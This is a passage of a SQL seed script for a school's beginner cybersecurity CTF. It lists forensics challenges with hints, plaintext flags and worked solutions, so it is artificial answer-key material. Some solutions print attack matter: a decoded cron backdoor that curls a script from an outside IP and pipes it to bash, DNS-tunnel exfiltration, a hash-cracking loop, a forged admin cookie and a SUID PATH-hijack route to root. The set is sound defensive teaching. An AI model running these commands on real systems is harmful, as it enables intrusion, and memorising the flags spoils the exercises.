Files: assets/ctf-files/f-pw-entropy/policy.txt', 'log2(7776) is about 12.92, log2(26) about 4.70, log2(94) about 6.55. Python: import math; 4*math.log2(7776)', '', '59e799b4eba4312b1ac85259ce653a9f7fbb63b54ddbf1a6ac4c3b97fef641cb', 'aayat{52_38_66}', 'A = 4 x log2(7776) = 51.7; B = 8 x log2(26) = 37.6; C = 10 x log2(94) = 65.5. The passphrase beats the 8-letter password by about 14 bits (16,000 times more guesses).', 101, true, true),
('f-acrostic', 1, 100, 'A memo with a margin', 'An insider is suspected of leaking a message inside a harmless-looking staff memo. Nothing in the words looks secret. Download memo.txt and look at it a different way.

The hidden message is one word. Flag: aayat{word}

Files: assets/ctf-files/f-acrostic/memo.txt', 'Hiding a message in the first letter of each line has a name: an acrostic.', '', '0052f2a3591b30a028cb45f9b09e392b38905984ebe4ad65828cf04ecfff3586', 'aayat{readthemargin}', 'Read the first letter of each body line: R-E-A-D-T-H-E-M-A-R-G-I-N.', 102, true, true),
('f-zero-width', 1, 200, 'Nothing to see here', 'notice.txt looks like a two-line note from a teacher, but the file is far bigger than two lines of text should be. Something invisible is inside.

Find it and decode it. The result is the flag.

Files: assets/ctf-files/f-zero-width/notice.txt', 'Some Unicode characters have zero width. CyberChef''s Escape Unicode Characters shows them as \u200B and \u200C. Two different symbols means binary.', 'cyberchef/index.html', '30734d2da3376dee24c43ac24ac3f4d2c5fab0cb89064acd5a8dec7eb08c505f', 'aayat{invisible_ink_is_still_ink}', 'After ''Hi team,'' (and a U+200D marker) are 264 zero-width characters: U+200B = 0, U+200C = 1. In CyberChef: Escape Unicode Characters, keep only the \u200b/\u200c run, Find/Replace \u200b->0 and \u200c->1, then From Binary.', 103, true, true),
('f-door-forced', 2, 200, 'The door that opened itself', 'The server room door controller logs every badge swipe (SWIPE_OK / SWIPE_DENIED), every press of the exit button inside (REX), and every time the door physically opens or closes.

A door should only open right after SWIPE_OK or REX at the same door. One evening, one door opened with neither. Download door_events.csv and find when.

Flag: aayat{HH:MM:SS} of the unexplained DOOR_OPEN.

Files: assets/ctf-files/f-door-forced/door_events.csv', 'Filter to DOOR_OPEN rows, then check the row just before each one at the same door. A spreadsheet filter or a short Python loop both work.', '', '16f0ad296f8274f7b5e3776cb3ff855319feb0a2cfa0c77c9c95ee61006a56f6', 'aayat{22:14:31}', 'At 22:14:05 and 22:14:12 badge B-5520 is denied at the Server room. At 22:14:31 the door opens with no swipe or REX, then it is held open (DOOR_HELD). Someone forced or propped it after being refused.', 104, true, true),
('f-timeline', 2, 300, 'Put it in order', 'Payroll data leaked on 3 November. Five systems each saw part of it, but every log keeps time differently: UTC, India time (UTC+05:30), US Eastern (UTC-05:00) and Unix epoch seconds.

Find these five events in the files:
A. Badge B-2093 (rkapoor''s) leaves through the lobby
B. A VPN login as rkapoor from outside
C. rkapoor''s account reads payroll_2026.xlsx
D. rkapoor''s password is reset through the helpdesk chat
E. A USB storage stick is mounted on WS-14

Convert every time to UTC and put the events in order, earliest first. Flag: aayat{five letters}, for example aayat{abcde}

Files: assets/ctf-files/f-timeline/badge_IST.csv assets/ctf-files/f-timeline/vpn_UTC.log assets/ctf-files/f-timeline/fileserver_EST.log assets/ctf-files/f-timeline/directory_events.json assets/ctf-files/f-timeline/ws14_IST.log', 'Subtract 5:30 from India times; add 5 hours to Eastern times (and mind AM/PM); an epoch converter (or CyberChef From UNIX Timestamp) gives UTC directly.', '', '5cd238d4cbe2fd6bd81b7180c665fab4bd5783eac077dbd3b6ab5bc3c186bb81', 'aayat{bdaec}', 'UTC: B 15:58:12, D 16:02:40, A 16:10:05, E 16:21:33, C 16:47:19. Someone was on the VPN as rkapoor before the helpdesk reset the password, rkapoor then left the building, a USB stick went into WS-14, and the payroll read came last, with rkapoor no longer on site.', 105, true, true),
('f-acl', 2, 100, 'Who should not have got in?', 'The school file server should follow least privilege: each role may use only its own folders (roles.txt), and every user has one role (users.tsv).

The server''s access.log shows one request that was ALLOWED even though the user''s role should not reach that folder. A misconfigured permission let them in.

Flag: aayat{username}

Files: assets/ctf-files/f-acl/roles.txt assets/ctf-files/f-acl/users.tsv assets/ctf-files/f-acl/access.log', 'DENY lines are the system working. Look only at ALLOW lines and check each path against that user''s role.', '', 'ed1c05833bfca9d166df8c15b7ceb33555a5f2cea13b60fd9ee8ec928d0e763e', 'aayat{jrao}', 'jrao is a student (only /shared and /homework) but has an ALLOW for WRITE on /grades at 13:07:44.', 106, true, true),
('f-http-capture', 3, 100, 'Login over plain HTTP', 'A teacher logged into the grades portal from the cafe''s open Wi-Fi. Someone else on the network ran tcpdump. Download capture.txt and find what they saw.

The teacher''s password is the flag.

Files: assets/ctf-files/f-http-capture/capture.txt', 'Port 443 is encrypted (TLS), so it looks like noise. Port 80 is plain HTTP. Look for a POST, then URL-decode %7B and %7D.', 'cyberchef/index.html', 'd4b1587cc6bd418ad1bbd6e3886164ab3b4f6ec49dd2d43db27110489db11ecc', 'aayat{cleartext_travels_naked}', 'The POST to 203.0.113.40:80 carries username=dmehta&password=aayat%7Bcleartext_travels_naked%7D; URL Decode gives the flag.', 107, true, true),
('f-firewall', 3, 200, 'First match wins', 'rules.txt is the firewall in front of the school servers. packets.txt lists nine connection attempts. Work out which packets get through.

Flag: the allowed packet numbers in ascending order joined by dashes, for example aayat{1-2-9}

Files: assets/ctf-files/f-firewall/rules.txt assets/ctf-files/f-firewall/packets.txt', 'Rule order matters: stop at the first rule that matches protocol, source, destination and port. 10.0.8.0/25 covers .0 to .127 only; 10.0.0.0/16 is 10.0.x.x; 10.0.0.0/8 is any 10.x.x.x.', '', 'cd0e3969ac8d955e094ec1959e6376787e6c4e7b12361080ffbf241c23e30341', 'aayat{2-3-4-6}', 'Allowed: 2, 3, 4, 6. Packet 1 (10.0.8.130) misses rule 1 (/25 ends at .127) and hits rule 2 DENY; packet 3 matches rule 3 before rule 5 can deny 203.0.113.0/24; packet 5 is denied by rule 5 before rule 6; packet 8 (10.1.0.4) is outside 10.0.0.0/16; packet 9 is not 10.x and port 3306 is outside 3000-3999.', 108, true, true),
('f-dns-exfil', 3, 300, 'Data in the DNS', 'The firewall blocks uploads, but every machine may still ask the DNS server for names. At 2 a.m., one workstation started asking for very strange names. Download dns.log, reassemble what it smuggled out, and decode it.

Files: assets/ctf-files/f-dns-exfil/dns.log', 'Filter for the odd domain. Each name starts with a sequence number; the queries did not arrive in order. Sort by the number, join the hex parts, then From Hex.', 'cyberchef/index.html', '11cc35cdb2455ffb20ba0b92bb7f9fd5125e982f719ab3b44ed20fd07c576ddb', 'aayat{dns_is_a_sneaky_tunnel}', '10.0.4.27 sends TXT queries NN-<10 hex chars>.cdn-sync.example. grep cdn-sync dns.log, sort by NN, join the hex: 61617961747b646e735f69735f615f736e65616b795f74756e6e656c7d -> From Hex -> the flag.', 109, true, true),
('f-arp-spoof', 3, 200, 'Who is pretending to be the router?', 'Library PCs feel slow and a student says the grades site showed a certificate warning. The router is 10.0.0.1. Download the three files: arp -a from a library PC, the switch''s arpwatch log, and the DHCP server''s lease log.

Someone is poisoning ARP caches so the PCs send router traffic to them. Find the attacker''s own IP address. Flag: aayat{ip}

Files: assets/ctf-files/f-arp-spoof/dhcp.log assets/ctf-files/f-arp-spoof/arp_a.txt assets/ctf-files/f-arp-spoof/arpwatch.log', 'Find the MAC address the PC now thinks belongs to 10.0.0.1. Then find which device the DHCP server gave that exact MAC to. Watch out for a MAC that differs in only the last digit.', '', '03f8c06c77be2cafaa38ec06db0ba45d8b19ec700beb5e4695fc7cf87e2335c7', 'aayat{10.0.0.66}', 'arp -a shows 10.0.0.1 at 5c:e9:1e:77:a0:3f, and arpwatch reports flip flops between the real router 00:1a:2b:3c:4d:01 and 5c:e9:1e:77:a0:3f. dhcp.log leased 10.0.0.66 to 5c:e9:1e:77:a0:3f (android-7d1e). 10.0.0.67''s MAC ends a0:40, not a0:3f.', 110, true, true),
('f-auth-brute', 4, 100, 'Brute force, then a break-in', 'web01''s /var/log/auth.log from 2 November. Someone hammered SSH with password guesses, and one guess worked. Download auth.log and answer two questions: which IP ran the attack, and which account did it get into?

Flag: aayat{ip_username}

Files: assets/ctf-files/f-auth-brute/auth.log', 'Count Failed password lines per source IP (grep "Failed password" auth.log | awk ''{print $(NF-3)}'' | sort | uniq -c). Then look for an Accepted line from the same IP.', 'linux.html', 'ce555baf6b0facecb9bb56aee614bd0f1f224c13ee347bcf92ea251313e6809b', 'aayat{203.0.113.45_backup}', '203.0.113.45 has 180 failures across many usernames, then ''Accepted password for backup from 203.0.113.45''. tlee''s five fails from 10.0.2.31 are a person mistyping; 198.51.100.200 tried only 9 times and never got in.', 111, true, true),
('f-cron', 4, 100, 'Every ten minutes', 'web01 keeps reconnecting to an unknown server even after a reboot. An investigator dumped every scheduled task on the box into crontabs.txt. One of them is persistence: the attacker''s way back in.

Find it, decode what it really runs, and the flag is inside.

Files: assets/ctf-files/f-cron/crontabs.txt', 'A web server account (www-data) has no business running scheduled jobs. echo ... | base64 -d | sh hides the real command.', 'cyberchef/index.html', 'b090af3da4723f245b7d0bf5b26b5bed1b337f8a0be758cb11a2e9e0aca520df', 'aayat{cron_never_forgets}', 'www-data runs */10 * * * * echo <base64> | base64 -d | sh. Decoding gives: curl -fsS ''http://198.51.100.9:8443/k.sh?id=web01&tag=aayat{cron_never_forgets}'' | bash >/dev/null 2>&1', 112, true, true),
('f-suid', 4, 200, 'One SUID too many', 'A SUID program runs as its owner (here, root) no matter who starts it. During a review of a shared Linux server you ran find for SUID files, then strings on the one that looked out of place. Download suid.txt.

Which program is the risk, and which command does it call without a full path (which a user could hijack through PATH)?

Flag: aayat{program_command}, for example aayat{ping_ls}

Files: assets/ctf-files/f-suid/suid.txt', 'Most of the list is standard on every Linux box. Look for one in an unusual folder, then read its strings: system() with a bare command name.', 'linux.html', 'cd6cabcd33a7e1e44bfafa261dcdb607b3e8ff4bdbda96c9641c5757e6cbb1bb', 'aayat{sysbackup_tar}', '/opt/tools/sysbackup is SUID root and not a standard tool. strings shows system() and ''tar czf ...'' with no /usr/bin/ path, so a user can put their own tar first in PATH and get a root shell. Fix: remove SUID or use absolute paths and drop privileges.', 113, true, true),
('f-hash-id', 4, 200, 'Name the hash, then crack it', 'A config backup leaked three service-account password hashes (hashes.txt). Each uses a different unsalted algorithm. Identify each algorithm by its length, then crack all three with wordlist.txt.

Flag: aayat{print_backup_admin}, the three passwords in that order joined by underscores.

Files: assets/ctf-files/f-hash-id/wordlist.txt assets/ctf-files/f-hash-id/hashes.txt', '32 hex characters = 128 bits (MD5), 40 = 160 bits (SHA-1), 64 = 256 bits (SHA-256). Hash every word and compare; in Python: hashlib.md5(w.encode()).hexdigest()', 'linux.html', 'a3cd874119acf69e8df1fd1fdb4fa71fd40039c5fae182db7f56dc548f5f7442', 'aayat{biryani_kestrel_lighthouse}', 'MD5 76d788a2600b609bb0a08443e03df95b = biryani; SHA-1 9d65c9c5a1edcfbe9f2f916eba32c3255d29c75a = kestrel; SHA-256 b370de14e94142d4a108a79df6d0e265a0ba3fa2e10f57c4b3a892b74c9f84aa = lighthouse. Example: for w in $(cat wordlist.txt); do echo -n $w | sha1sum | grep -q <hash> && echo $w; done', 114, true, true),
('f-vigenere-story', 5, 200, 'The river key', 'A courier''s notebook page was photographed and typed up as field_notes.txt. The message at the bottom is a Vigenere cipher, and the key is hidden in the story.

Recover the key, decrypt the message, and submit it.

Files: assets/ctf-files/f-vigenere-story/field_notes.txt', 'The key is a single word: the name of a river in the notes. CyberChef has Vigenere Decode; it leaves { } and _ alone.', 'cyberchef/index.html', 'b5d252c3798a00f7f2ed8fea72cc5d0650f31d71029ed16b79b6f1add91ba075', 'aayat{the_river_remembers}', 'Key NARMADA. napmt{whr_rzheu_rrmvybhrf} -> Vigenere Decode (key narmada) -> aayat{the_river_remembers}.', 115, true, true),
('f-xor-repeat', 5, 300, 'Known plaintext', 'We intercepted intercept.hex from a gang that encrypts with repeating-key XOR: a short key, repeated over the whole message. The key is not a single byte, so brute force over 256 keys will not work.

But we know every message they send starts with aayat{ . Use that to recover the key, then decrypt.

Files: assets/ctf-files/f-xor-repeat/intercept.hex', 'XOR is its own inverse: ciphertext XOR plaintext = key. XOR the first bytes with the text aayat{ and look for a pattern that repeats. CyberChef: From Hex, then XOR with key type UTF8.', 'cyberchef/index.html', '57193370a2a03fe852ca3e2105813b8df06d43b701b316e3847c3afc7590a460', 'aayat{known_plaintext_breaks_repeating_xor}', 'First 6 bytes XOR ''aayat{'' = K3y!K3, so the key is K3y! (4 bytes). From Hex + XOR (UTF8 key K3y!) gives: aayat{known_plaintext_breaks_repeating_xor} -- next drop is Thursday, same place.', 116, true, true),
('f-cookie', 5, 100, 'Trusting the cookie', 'request.txt is what your browser sends to the school portal; server_code.txt is the excerpt of the portal''s Node.js code that guards /admin. The server trusts a value that you control.

What exact role cookie value would get you into /admin? Flag: aayat{cookie value}

Files: assets/ctf-files/f-cookie/request.txt assets/ctf-files/f-cookie/server_code.txt', 'c3R1ZGVudA== is not random. Decode it, change it, encode it the same way.', 'cyberchef/index.html', '583ec0fef749e01442d1f70240392163a1fb1ec6005daca8d4a3ef4f0fb73221', 'aayat{YWRtaW4=}', 'role=c3R1ZGVudA== is base64 for ''student''. The server only base64-decodes and compares, with no signature, so base64(''admin'') = YWRtaW4= works. The fix is server-side sessions or a signed token.', 117, true, true),
('f-card-regex', 5, 200, 'Card numbers in the dump', 'A support team''s notes leaked (support_dump.txt). Many lines contain long numbers: order IDs, tracking numbers, payment references. Exactly one is a real, valid card number, which means the company stored card data where it should not (a PCI DSS problem).

Use a regular expression to find every card-like number (16 digits, possibly in groups of 4 separated by spaces or dashes), then check each with the Luhn algorithm. Flag: aayat{last four digits of the valid card}

Files: assets/ctf-files/f-card-regex/support_dump.txt', 'Regex: \b(?:\d{4}[ -]?){3}\d{4}\b. Strip spaces and dashes, then run Luhn: double every second digit from the right, subtract 9 if over 9, sum; valid if the sum ends in 0. CyberChef has a Luhn Checksum operation.', 'cyberchef/index.html', 'a3d2a26a3e27a60b625e266a198080a288eb482d274609175772dcba4261c8e5', 'aayat{8991}', 'Only 4547156775178991 passes Luhn; every other 16-digit run (order IDs, tracking numbers, other payment refs) fails it. Python: re.findall the pattern, strip separators, keep the ones where luhn() is true.', 118, true, true),
('f-chain', 5, 200, 'Five layers', 'Malware hid its config string under five layers of encoding (blob.txt). Each layer''s output is the next layer''s input. Peel them one by one: after each step ask what the result looks like.

The last layer gives the flag.

Files: assets/ctf-files/f-chain/blob.txt', 'Only A-Z and 2-7 with = padding is Base32. Only 0-9a-f is hex. A Base64 string with the = at the front has been reversed. If the result looks like nnlng{...}, it''s ROT13.', 'cyberchef/index.html', '0c1cfe3929b3dfda4d4206ead71c2a61eb8c81e812ce44e02af61e9ac82988e3', 'aayat{peel_every_layer}', 'From Base32 -> From Hex -> Reverse -> From Base64 -> ROT13.', 119, true, true),
('rb-first', 1, 100, 'Your first investigation', 'Work the Maple Grove Wi-Fi tutorial runbook. The attacker replaced the Wi-Fi banner with text that looks like nonsense. Decode it.
', 'Step 11: curl the banner, then pipe it to base64 -d.', 'notebook.html#nb-cases-h', '04171226c016222496078259f7f6cf083f5120ae14d0ddc09b655a5c6f3a8279', 'aayat{one_command_at_a_time}', 'curl -s http://wifi.maplegrove.lan/banner.txt | base64 -d', 50, true, true),
('rb-miner', 5, 200, 'The miner in the build server', 'Work the Brightloom build server runbook. The attacker left three ways back in. One of them carries a comment.
', 'Step 7: read every file in persist/, especially root_authorized_keys.', 'notebook.html#nb-cases-h', 'b348230214cdb64c85db099523f09ca23fb2657afd5d3e004e8d500ea60cc16a', 'aayat{three_ways_back_in}', 'The comment on the second key in persist/root_authorized_keys (also served at http://198.51.100.23/k.pub).', 50, true, true),
('rb-quietdns', 4, 250, 'Quiet DNS', 'Work the Harbourline DNS runbook. A file left the building inside DNS query names. Rebuild it and read its doc-id.
', 'Step 7: collect the numbered base32 chunks under k7q2.t.cloudmetric.example, drop duplicates, sort, join and base32-decode.', 'notebook.html#nb-cases-h', 'de7afbd38a37e3d143a1a73b738141dae1092a0a8db0c7d3fb3c4bb02f91c486', 'aayat{dns_is_not_just_names}', 'Run the step 7 Python cell; the second line of board_pay_review_2027.csv is the doc-id.', 50, true, true),
('rb-tc-grades', 2, 100, 'Who changed the grades?', 'Grades changed under a teacher''s name, in subjects he doesn''t teach, from a student lab PC. Use the audit log, sign-in records and lab logins to find out how, and fix the access control. Work the case in a notebook and find the flag.
', 'Read each step of the runbook, then look through the evidence it points to.', 'notebook.html#nb-cases-h', 'db6f3c5f332b9c24d4bf78dbbf7c2a46db825f5ef444db1d29f5da734fcecaab', 'aayat{log_out_of_shared_pcs}', 'See the last steps of this case''s runbook.', 60, true, true),
('rb-tc-library-spray', 2, 100, 'Password spraying at the library portal', 'Nobody was locked out, yet a library member''s account was taken over. Find the slow password spray, the one account it opened and what the attacker changed. Work the case in a notebook and find the flag.
', 'Read each step of the runbook, then look through the evidence it points to.', 'notebook.html#nb-cases-h', '240b150d8d76a8234837e1c03d932cc33319c8d38600865680e2a0c7061a72e1', 'aayat{one_password_many_doors}', 'See the last steps of this case''s runbook.', 60, true, true),
('rb-tc-qr-parking', 1, 100, 'The QR code parking fine', 'Fake parking fines arrive by text and by QR stickers on parking meters. Compare the fake site with the real one and find where the card details go. Work the case in a notebook and find the flag.
', 'Read each step of the runbook, then look through the evidence it points to.', 'notebook.html#nb-cases-h', 'a903d5bbc5a0f2f5298f2ea74e2f8f2a61e7b816e0d60eff7fde8a77d4b9aa72', 'aayat{scan_then_check_the_link}', 'See the last steps of this case''s runbook.', 60, true, true)
on conflict (id) do update set unit = excluded.unit, points = excluded.points, title = excluded.title,
  body = excluded.body, hint = excluded.hint, link = excluded.link, flag_hash = excluded.flag_hash,
  flag = excluded.flag, solve = excluded.solve, sort = excluded.sort, builtin = true;
update ctf_challenges set active = false where builtin and id not in ('cc-base64', 'cc-layers', 'cc-xor', 'cc-vigenere', 'cc-crack', 'cc-jwt', 'net-basic', 'net-scan', 'se-link', 'se-headers', 'phys-badge', 'lx-crack', 'lx-key', 'sqli-login', 'sqli-hidden', 'sqli-union', 'sqli-fix', 'shop-error', 'shop-sqli', 'shop-admin', 'shop-idor', 'shop-backup', 'shop-xss', 'shop-negative', 'shop-feedback', 'shop-reset', 'shop-jwt', 'rb-phish', 'rb-insider', 'rb-web01', 'rb-cloudkey', 'rb-ddos', 'sqli-schema', 'sqli-blind', 'shop-coupon', 'shop-redirect', 'shop-upload', 'se-homoglyph', 'se-shortlink', 'phys-badge-hex', 'phys-insider-usb', 'net-backdoor-port', 'net-dns-before', 'lx-octal', 'lx-md5-wordlist', 'app-urldecode', 'app-cloud-user', 'f-phish-eml', 'f-pw-entropy', 'f-acrostic', 'f-zero-width', 'f-door-forced', 'f-timeline', 'f-acl', 'f-http-capture', 'f-firewall', 'f-dns-exfil', 'f-arp-spoof', 'f-auth-brute', 'f-cron', 'f-suid', 'f-hash-id', 'f-vigenere-story', 'f-xor-repeat', 'f-cookie', 'f-card-regex', 'f-chain', 'rb-first', 'rb-miner', 'rb-quietdns', 'rb-tc-grades', 'rb-tc-library-spray', 'rb-tc-qr-parking');
